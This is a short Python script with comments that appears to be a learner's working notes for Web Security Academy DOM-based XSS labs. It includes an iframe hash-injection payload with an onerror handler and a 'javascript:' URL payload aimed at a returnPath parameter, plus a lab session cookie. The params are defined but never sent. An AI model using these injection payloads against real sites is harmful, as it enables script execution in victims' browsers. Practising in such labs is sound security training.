# NOT UNDERSTAND YET
# IN exploit server
# <iframe src="https://0a350028045a9bd2c011c31d000900f1.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

import requests

url = "https://0ade002703167df7c046594e00d20016.web-security-academy.net/"

cookies = {
	"session": "kLkt8CgKM9XdTQvXnFrAfjY0xNA5KocL"
}

PAYLOAD = "javascript:alert(window.location)"
params = {
	"returnPath": PAYLOAD
}

r = requests.get(url, cookies=cookies)

print(r.text)
# print(r.url)
